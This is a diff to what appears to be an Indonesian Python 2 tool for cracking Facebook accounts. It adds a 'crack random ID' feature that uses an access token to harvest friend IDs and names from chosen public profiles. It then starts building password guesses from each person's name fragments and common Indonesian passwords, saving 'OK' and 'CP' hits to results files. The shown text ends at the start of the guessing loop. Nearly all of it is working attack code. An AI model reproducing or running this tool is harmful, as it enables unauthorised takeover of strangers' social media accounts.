@@ -23,6 +23,7 @@ except ImportError:
     os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
 import requests, bs4, sys, os, subprocess, random, time, re, json
 from concurrent.futures import ThreadPoolExecutor as YayanGanteng
+from multiprocessing.pool import ThreadPool
 from datetime import datetime
 from time import sleep
 ct = datetime.now()
@@ -61,6 +62,7 @@ cp = []
 id = []
 user = []
 loop = 0
+pwx = []
 tt = []
 # lempankkkkkkkk
 def jalan(z):
@@ -165,10 +167,11 @@ def moch_yayan():
     print ' [%s2%s] Intip dari Teman Publik'%(K,N)
     print ' [%s3%s] Intip dari Total Followers'%(K,N)
     print ' [%s4%s] Intip dari Like Postingan'%(K,N)
-    print ' [%s5%s] %sMULAI INTIP'%(K,N,H)
-    print ' %s[%s6%s] Cek Informasi Akun FB'%(N,K,N)
-    print ' [%s7%s] Cek Hasil Intip'%(K,N)
-    print ' [%s8%s] Info %sSC ROY-RMBF'%(K,N,H)
+    print ' [%s5%s] %sMULAI INTIP%s'%(K,N,H,N)
+    print ' [%s6%s] Crack dengan id random'%(K,N)
+    print ' %s[%s7%s] Cek Informasi Akun FB'%(N,K,N)
+    print ' [%s8%s] Cek Hasil Intip'%(K,N)
+    print ' [%s9%s] Info %sSC ROY-RMBF'%(K,N,H)
     print ' %s[%s0%s] Logout (%sGanti/Hapus Token FB%s)'%(N,M,N,M,N)
     awokawokawokawokawokawokawokawokawokawokawokawok()
 def awokawokawokawokawokawokawokawokawokawokawokawok():
@@ -186,9 +189,11 @@ def awokawokawokawokawokawokawokawokawokawokawokawok():
         elif yan =='5':
                 __crack__().slurr()
         elif yan =='6':
+        	crack_random()
+        elif yan =='7':
         	jalan('\n NOTE! Ketik %suser%s jika anda ingin mendapatkan ID dari username'%(H,N));time.sleep(0.07)
         	cek_ingfo()
-        elif yan =='7':
+        elif yan =='8':
             print("\n \033[0;97m[\x1b[1;92m1\033[0;97m] Cek hasil \x1b[1;92mOK\x1b[0m")
             print(" \033[0;97m[\x1b[1;93m2\033[0;97m] Cek hasil \x1b[1;93mCP\x1b[0m")
             ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Pilih : ")
@@ -221,7 +226,7 @@ def awokawokawokawokawokawokawokawokawokawokawokawok():
                     moch_yayan()
             else:
                 moch_yayan()
-        elif yan =='8':
+        elif yan =='9':
         	info_tools()
         elif yan =='0':
             	print '\n'
@@ -555,6 +560,758 @@ def info_tools():
     print '%s[%s*%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m';time.sleep(0.07)
     raw_input('[%s KEMBALI%s ]'%(O,N))
     moch_yayan()
+
+def crack_random():
+	try:
+		__cindy__= open('__yayan__.txt', 'r').read()
+	except IOError:
+		print '\n %s[%sx%s] Token Invalid'%(N,M,N)
+		yayanxd()
+	os.system('clear')
+	print logo
+	print '\n %s[%s!%s] Ketik menu jika ingin ke menu tampilan awal\n'%(N,M,N)
+	print ' %s[%s#%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m'
+	limt = raw_input(' %s[%s?%s] Berapa Target : %s'%(N,M,N,H))
+	if limt =='':
+		print ' %s[%s!%s] Wajib Diisi !'%(N,M,N)
+		crack_random()
+	elif limt in ('MENU', 'Menu', 'menu'):
+		moch_yayan()
+	elif limt == '1':
+		idt1 = raw_input(' %s[%s*%s] ID Publik :%s '%(N,O,N,H))
+		try:
+			lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,O))
+			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print '\n %s[%s!%s] ID Tidak Ada !'%(N,M,N)
+			crack_random()
+	elif limt == '2':
+		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,O,N,H))
+		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,O,N,H))
+		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,O))
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
+	elif limt == '3':
+		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,O,N,H))
+		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,O,N,H))
+		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,O,N,H))
+		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,O))
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
+	elif limt == '4':
+		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,O,N,H))
+		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,O,N,H))
+		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,O,N,H))
+		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,O,N,H))
+		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,O))
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
+	elif limt == '5':
+		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,O,N,H))
+		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,O,N,H))
+		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,O,N,H))
+		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,O,N,H))
+		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,O,N,H))
+		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,O))
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
+	elif limt == '6':
+		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,O,N,H))
+		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,O,N,H))
+		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,O,N,H))
+		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,O,N,H))
+		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,O,N,H))
+		idt6 = raw_input(' %s[%s*%s] ID Publik 6 :%s '%(N,O,N,H))
+		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,O))
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 6 Tidak Ada !'%(N,M,N)
+	elif limt == '7':
+		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,O,N,H))
+		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,O,N,H))
+		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,O,N,H))
+		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,O,N,H))
+		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,O,N,H))
+		idt6 = raw_input(' %s[%s*%s] ID Publik 6 :%s '%(N,O,N,H))
+		idt7 = raw_input(' %s[%s*%s] ID Publik 7 :%s '%(N,O,N,H))
+		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,O))
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 6 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt7+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 7 Tidak Ada !'%(N,M,N)
+	elif limt == '8':
+		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,O,N,H))
+		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,O,N,H))
+		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,O,N,H))
+		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,O,N,H))
+		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,O,N,H))
+		idt6 = raw_input(' %s[%s*%s] ID Publik 6 :%s '%(N,O,N,H))
+		idt7 = raw_input(' %s[%s*%s] ID Publik 7 :%s '%(N,O,N,H))
+		idt8 = raw_input(' %s[%s*%s] ID Publik 8 :%s '%(N,O,N,H))
+		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,O))
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 6 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt7+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 7 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt8+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 8 Tidak Ada !'%(N,M,N)
+	elif limt == '9':
+		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,O,N,H))
+		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,O,N,H))
+		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,O,N,H))
+		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,O,N,H))
+		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,O,N,H))
+		idt6 = raw_input(' %s[%s*%s] ID Publik 6 :%s '%(N,O,N,H))
+		idt7 = raw_input(' %s[%s*%s] ID Publik 7 :%s '%(N,O,N,H))
+		idt8 = raw_input(' %s[%s*%s] ID Publik 8 :%s '%(N,O,N,H))
+		idt9 = raw_input(' %s[%s*%s] ID Publik 9 :%s '%(N,O,N,H))
+		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,O))
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 6 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt7+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 7 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt8+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 8 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt9+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 9 Tidak Ada !'%(N,M,N)
+	elif limt == '10':
+		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,O,N,H))
+		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,O,N,H))
+		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,O,N,H))
+		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,O,N,H))
+		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,O,N,H))
+		idt6 = raw_input(' %s[%s*%s] ID Publik 6 :%s '%(N,O,N,H))
+		idt7 = raw_input(' %s[%s*%s] ID Publik 7 :%s '%(N,O,N,H))
+		idt8 = raw_input(' %s[%s*%s] ID Publik 8 :%s '%(N,O,N,H))
+		idt9 = raw_input(' %s[%s*%s] ID Publik 9 :%s '%(N,O,N,H))
+		idt10 = raw_input(' %s[%s*%s] ID Publik 10 :%s '%(N,O,N,H))
+		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,O))
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 6 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt7+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 7 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt8+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 8 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt9+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 9 Tidak Ada !'%(N,M,N)
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt10+"/friends?limit="+lim+"&access_token="+__cindy__)
+			j = json.loads(r.text)
+			for a in j['data']:
+				ngentod = a['id']
+				tante = a['name']
+				id.append(ngentod+'[-]'+tante)
+		except KeyError:
+			print ' %s[%s!%s] ID 10 Tidak Ada !'%(N,M,N)
+			
+	print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,str(len(id)),N)
+	ask = raw_input(' [%s?%s] Ingin menggunakan kata sandi manual? [%sY%s/%sT%s]: '%(K,N,H,N,M,N))
+	if ask == "Y" or ask == "y":
+		manual()  
+	print ' %s=================================================='%(N)
+	print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
+	print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
+	print ' %s=================================================='%(N)
+	print ' [%s!%s] %sMatikan data selular untuk menjeda proses'%(M,N,M)
+	print ' %s==================================================\n'%(N)
+	
+	def main(user):
+		global ok,cp,ttl,loop
+		pwx = []
+		sys.stdout.write(
+		      '\r [\x1b[1;96m*\x1b[0m] Intip : %s/%s \x1b[1;92mOK:%s \x1b[0m- \x1b[1;93mCP:%s \x1b[0m'%(loop,len(id),len(ok),len(cp))
+		); sys.stdout.flush()
+		try:os.mkdir("results")
+		except OSError:pass
+		uid,name=user.split("[-]")
+		for ss in name.split(" "):
+			if len(ss)<3:
+				continue
+			else:
+				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
+					pwx.append(ss+"123")
+					pwx.append(ss+"12345")
+				else:
+					pwx.append(ss+"123")
+					pwx.append(ss+"1234")
+					pwx.append(ss+"12345")
+					pwx.append("12345")
+					pwx.append(ss)
+		    #<---- Pw tambahan bebas mau di isi apa ----->
+					pwx.append("bismillah")
+					pwx.append("rahasia")
+					pwx.append("alhamdulillah")
+					pwx.append("cintaku")
+					pwx.append("sayangku")
+					pwx.append("katasandi")
+					pwx.append("sayang")
+		try:
+			for pw in pwx:
+				pw = pw.lower()
